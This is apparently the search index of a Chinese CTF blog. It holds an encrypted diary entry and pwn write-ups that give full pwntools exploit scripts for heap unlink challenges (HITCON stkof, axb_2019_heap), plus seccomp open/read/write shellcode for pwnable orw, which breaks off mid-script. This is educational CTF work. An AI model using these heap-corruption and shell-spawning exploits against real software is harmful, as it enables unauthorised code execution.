<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Diaries</title>
      <link href="/2021/12/26/diary/"/>
      <url>/2021/12/26/diary/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry incorrect password" data-whm="抱歉，信息无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="09361b0c469f6c5cb28895a0664d9ba9c44fb81cba33cb22626c17e1752f60f4">b6564b1d950e205446a5f2eabbefe8866c8c0c9144c3793e12be10a85944a02b9e5597b8013830aeb659dc6944f615e50212eca39800024b8915041b82abcbb1f909949a21ee7f948380a304a6a59254655a595662ef8de7c696c909b711d997e9eb675e8bea7c522698a91b595b6de3b69dcbba419572cc25b2185a4a82cce8bd2f6db3f7409fc95b7c5a9b3ba1ac7116919da19415da61d6b781aa18086d93dfeed04c4f81b9a2e2ee533e9db825675e10d1531160f7b3158e2e79b3c56ea069083c7c572d4e9e90fbbbd6b6755f7a70e691765c6234e8b30663740995bd9a157bdfd0047e76514ac4f89c7f453194a05a814b282265c9302fc51857f995e4010fae468aedf59cf8d02a50a16638422d7b29eb2774e6b44d3786131dd08f80185b89115c8f44850a75ce5852bcedad8957a1b0793c7e6339de5ee40130b024c91b4ce5b68fde1b79cb8130e8d1546c390bb72ab668236d7007c08912f687c1994a241a60dfa7e5c0c5477559644feb390cef5eb0fb5383caf8b13993502d3d9ce2380d2e346822ff931a3375e72cd568571c387f9762a664ea90900627b038861a1383ed19a29901ad10ae05429ba1e3627bb7ce1d0c993888c4bfb3d12c4bc4d91d3d2da3497f01319094c52d7e17036e025eaf1732e5ba714264ad7454291112b70483a4ba9aaecbc3a47da7d0be3b1f9fd0d18ada0122056aa443c24bf1a5a73d4a23b65a12e607e794c52b775aefb9b6210860e724999715a479b1fb524287d60ef43c1db037f5540d5db1e5fcadeee3ce77964efc9a24cdaf6281eb0004f1db42d5012582719bc20bd20e3a3119cda0e445ff9aa3497882ec0b54d10fdbba87ceb18e9121cde5e0204d21f22b4182bded3784849045161f045a7d3e29d9725e255c8aef501bfca97e461340ae17e09b9a72e3a52701486034861ce509e0d60028276f3b9efbcb9d9cd7872a0f4a6dd320123df8e71bef1436b01bdb843df2f21bc550b2ed8f1109bba2f13c0ee1072f984bf26d3976b1b26fe64801b3355e70a87059b0ee8facd989bcacd7c5fb83e4c88de349dfb664a058440f79e4fab1391efcdcc6312652d7ef3564bcbfd5120eeadbe25d5d35b33167464b2b13a7e9710cfd2d5e5855e37757ab2f664baec6268095abc67e22959e427479dc2c211fb65fc272afa03f0322759dfe52473ae9e6f869d015d1c029ab6fb3173e7b8cac34208c99ef4d3f51031bd48824cfda64bb4ef3d609c4cff7b8188fb69d505483f333e294ff22d532b587daa82e1e459b856cec1c29c8e138f1513993b3905406a5a6294141b755d401b97800f9ed9f0d965c382c900f5781308caf782bb3fca3b656e35e9b8640a9f2e333d25fa705d80cc95eb08cf15f557a5ba057d9a792ba3fb5f0408c273a56363dce042808398ec243da0020f293b2fedcdbcbd31a3f10b5a07d49e049e2eaa043a4232ab1fb86b19784cba2cb9f6d43a3ffd4b9ac58ede0aba3739885cb991f18719daed98bf240e2fa7a8e4406202a933842ab015de8b56c08aea1fe2f3bb8bf8be7fed795b6523bf7f68bac9f0bc81c67683a837f82c5eb599d8c0d6ee09dbf452fd4463cf090537a9a27037c5f0885f5621731c9f10617edd82f73cac28bc86a488559f37ea6d309f552c725851ad3a8018f92512e01aa25730c55a5f3e4bd6dc304a1471a8dd5bada58114dc28dc8788a75881f924e60fde96f56a391e04da341e774dc44442cefd4095c87a9d1a7cec92b023a06d70092a1ee0c7e0fa5adcd4f99fb609d7269e70f38a38b77cec17d0f95f35f0ef480d66046cec5779e57ebcc6d8f84170e4f9e904526c77a20cb964298534f97c85e4ea3590fd5f1d9163a01f318b419acd85d99ec2621bbd7d677773dea589d07813afdd2b2c34a7ec3ff61afab3c7f801369b3bf6ec90a1a5e5b2d3e8da02eebd2608052cc33f66ad223189d46c188fdce88038c526e9bb9dcb69c49ceec8d52ce9de4024f3974e85b618f85fba93b7a1b9f1d6a70e8370a7bb58dad93332a95132bc75705c79b532999c80b394626b905369069da7c6b84cf223108c5ed064d4e4eadf932896211de63e59c415d2420b11bfaa9f52a6ca443f75cab784304085b7287578a3e6cac1665e536962e50bb8b60431c0b55a6ed21fc8bd28af8f93809da8f5a9a66afd96e6f4938b853608e7556cda175b016fe84807d9d784432f0892a1adf49cfcc77f5e791bf0e36ddb3d617089232f5b05ae3dfbd3ff588550946b2ea5e68ba6fbeac953909423df405b4ddcd500268c5d375b20f93bd52eda68fed439160a4da74ed6f62642e8c561b794b96e2564945968b1a7407575f17cd000baf39920122d4de6f7db44d1b43adc9bab8ce4fbf76ee062503e2a5ab3f163f37cb14ca663d00b165155036698ccf3ecf0f77982028aed4a325e11944b53616d8bebc454e15bfb268528164eef976ba761e03e86d8f287056c8df5e4c9e97466409bd629c6c39dd853a5ef04b85eae33d8814f639013a23d78b6244eb57da0fe36c35f6c2779ce5e466a8c1162a2ab2bcb564977d8d19c4bdce5e33d6a6b0ccf3fbe81335f32e9204ac5f97c767aed7865d0556148ad555dab0ea2051490def843fbb82b8d7515016b706e528849a104dc8b5d36bcf54fc1a9dbbbaa85542fd218aa7cbfeb87587d0a9070ccc4c37a87bf6d749ebf2ad4fd7b0323f01e950d7a580877c4c1d58caaf938793a8fbff61dda15ae1a74fd3029845f6a4d7bef781452b981334ecaa509fbe48b2d39a37d1bd57b6d4cf76b7d448fb3549304469317d6d8fe0a0f7c919ca523c8308bb6c4a7d90ef8a18a7ab840aee67ed820da26e59fc9f9dcc5b2a9b92c9bb211a87e2495fc881daeb9100f94c6ce4f255df2d91011aab3b000d74819ed1cd001e9fe1561751c2ccf66e7f98a3f1af11f701870c452d519bad326738f27926f0066a75265555da34051af8270b78343c4b2b2d663b7fcdcf607e9d456daf0ea703e6a81cd6db12a070dae69c18892be87968b0106796c93873cb89aa2e7159eae36f01a19993735f8c12a37fc9036ba3a1c0ab692f34cf1e01bc51fece58ac0fa2a1b1d7f5a8689060f9ee2cf52606c7a0425ba49b32c58e56ae993527e56dca6c3e2a613dd92127974bc3834b4db8ccbed1534105c4cc616dc0e51060183fb41c84acdb0840fb7282e6eca62eef6cdab52d5d5596f0f86bb68dc1c05e0c4f5fc0bcbb73062732eddd21dbc6f0761348410486edeb8e674d88aaeaf3e101067bd42b566f428b542faf424a6e94de15f811b1b0c6c210ae2c08f3ffa21ed084333a3042647c05a9b35018ab6a478eb81794c6573c7db6be3f366e96830567f2bd30f1e2a99019226f2d73b3f18bb069cbee268e2af65f3a1d3ecce08369a77a9057216c25d716748d433fdd2ade782613539684de433df7f04a62c473de759c17c617f3cdf3e71536d5d6c329ece3b7ade8d67cbf93296a31714d439eedf53e5b8ed8a8ededc27ebbd16186b9b28be539508f227525353b10ce4c958ae3d19619a8dee7564f07a84394a14c003734748637a9c5e0bb2c7201ab2fc436546321742494c5e863b74edc4d8dc0d7d5463324729353d9cc3cf9955ee0eddd4d5cac3f7a0149c9165e9c6ff344c1d4675b336adf4544b34a17bae2f418dae9a7eb061666612883b6008ea252184d3dece44f1835ee39dc2781ad52e55c88503e8be7fca7f9e15ec4fd5a3a2b73019e3f1923df5792a10becff6c27adc2e33d01d74c142f626de851d344cc596209ab07203a686863014063d1a6904db8b09de55ba6dc48098927c36216c034fc40821a94c892c47a19a669913a871d704540f6fc3ef46f1e3cb7f0fcd2ed3fb76b80178f9e1788b8dc6276bf315e6a19795700e38db9d0a618e43482c7965215e0ceabb498e8be586dd1437bf45fd203865e6d1ea65ccde240c53cc41e1373c89d2cc9ce4c2290306fe5570601c46ed59d4541a18220deb3b447a05a97c83d8d1ce72a98e743a1e7ea20c8eec559a638fdef787380f4811e97da0445211cc46623d9d25d9441e5acd620719d7d789a05b5274d665aa247fb8e90b4e80fa8dfd02c2421f363c170f74f5f200d73f64a41a6ccd58c9e387321af8e34d86fe8e66129ce98e2a4d07e21097807aab74b818b05bf1bfc0496ecd5da43680d5d0285cb5ab8a0df4c37</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Pease input your password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/2021/11/25/unlink/"/>
      <url>/2021/11/25/unlink/</url>
      
        <content type="html"><![CDATA[<p>堆溢出漏洞——unlink</p><span id="more"></span><blockquote><p><a href="https://blog.csdn.net/qq_41202237/article/details/108481889?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163038712516780265472330%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163038712516780265472330&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108481889.first_rank_v2_pc_rank_v29&utm_term=hollk%20unlink&spm=1018.2226.3001.4187">推荐unlink基本知识讲解</a></p></blockquote><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">2014 HITCON stkof</a></h2><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./stkof&quot;</span></span><br><span class="line">hollkelf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    hollk = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hollk = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(hollk)[<span class="number">0</span>]))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    hollk.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    hollk.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    hollk.send(content)</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    hollk.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">    alloc(<span class="number">0x100</span>)  <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x30</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment"># small chunk size inorder to trigger unlink</span></span><br><span class="line">    alloc(<span class="number">0x80</span>)  <span class="comment"># idx 3</span></span><br><span class="line">    <span class="comment"># a fake chunk at global[2]=head+16 who&#x27;s size is 0x20</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment">#size</span></span><br><span class="line">    payload += p64(head - <span class="number">0x8</span>)  <span class="comment">#fd</span></span><br><span class="line">    payload += p64(head)  <span class="comment">#bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk&#x27;s prev_size bypass the check</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    <span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    <span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(hollk)</span></span><br><span class="line">    <span class="comment"># overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(hollkelf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(hollkelf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(</span><br><span class="line">        hollkelf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    <span class="comment"># edit free@got to puts@plt</span></span><br><span class="line">    payload = p64(hollkelf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#free global[1] to leak puts addr</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    puts_addr = hollk.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    <span class="comment"># modify atoi@got to system addr</span></span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    hollk.send(p64(binsh_addr))</span><br><span class="line">    hollk.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ol><li><p>pwndbg使用regs查看寄存器里得值</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111242245670.png" alt="image-20211124224540522"></p></li><li><p>利用思路</p><ul><li>利用格式化字符串泄露libc和程序基址</li><li>运用unlink将chunk 0 地址覆写为free_hook的地址</li><li>将system地址写入free_hook</li><li>触发写入的’/bin/sh’块的删除，执行system(‘/bin/sh’)</li></ul></li></ol><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,26144)</span></span><br><span class="line">p = process(<span class="string">&quot;./axb_2019_heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_heap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23-64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;):&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content: \n&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%11$p%15$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1186</span></span><br><span class="line"><span class="comment">#success(&quot;base:&quot;+hex(base))</span></span><br><span class="line">libcbase=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss=base+<span class="number">0x202060</span></span><br><span class="line">success(<span class="string">&quot;bss:&quot;</span>+<span class="built_in">hex</span>(bss))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+<span class="string">&#x27;\xa0&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook)+p64(<span class="number">0x10</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnable orw</title>
      <link href="/2021/11/17/pwnable_orw/"/>
      <url>/2021/11/17/pwnable_orw/</url>
      
        <content type="html"><![CDATA[<p>prctl内核沙箱机制</p><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>prctl seccomp相当于内核中的一种安全机制，正常情况下，程序可以使用所有的syscall，但是当劫持程序流程之后通过exeve来呼叫syscall得到shell时过滤掉某些syscall，只允许使用部分syscall。</p><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172023579.png" alt="image-20211117202323531"></p><p>开启了canary</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172031319.png" alt="image-20211117203126264"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172032512.png" alt="image-20211117203205447"></p><p>本题系统内核只允许使用sys_open，sys_read，sys_write</p><p>第一次调用prctl函数 禁止提权,第二次调用prctl函数 限制能执行的系统调用只有open，write，exit</p><p>总体思路是：open flag -&gt;read-&gt;write</p><ol><li>sys_open</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push <span class="number">0x0</span>  <span class="comment">#字符串结尾</span></span><br><span class="line">push <span class="number">0x67616c66</span><span class="comment">#&#x27;flags&#x27;</span></span><br><span class="line">mov ebx,esp</span><br><span class="line">xor ecx,ecx<span class="comment">#0</span></span><br><span class="line">xor edx,edx<span class="comment">#0</span></span><br><span class="line">mov eax,<span class="number">0x5</span><span class="comment">#调用号</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span><span class="comment">#sys_open(flags,0,0)</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>sys_read(2,file,0x100) 系统调用号为3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x3</span>; </span><br><span class="line">mov ecx,ebx;<span class="comment"># ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</span></span><br><span class="line">mov ebx,<span class="number">0x3</span>;<span class="comment"># 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件</span></span><br><span class="line">mov edx,<span class="number">0x100</span>;<span class="comment">#对应字节数</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>sys_write(1,file,0x30) 系统调用号为4</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x4</span>;<span class="comment"># eax = sys_write</span></span><br><span class="line">mov ebx,<span class="number">0x1</span>;<span class="comment"># ebx = unsigned int fd = 1</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure><p>exp:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn  <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = 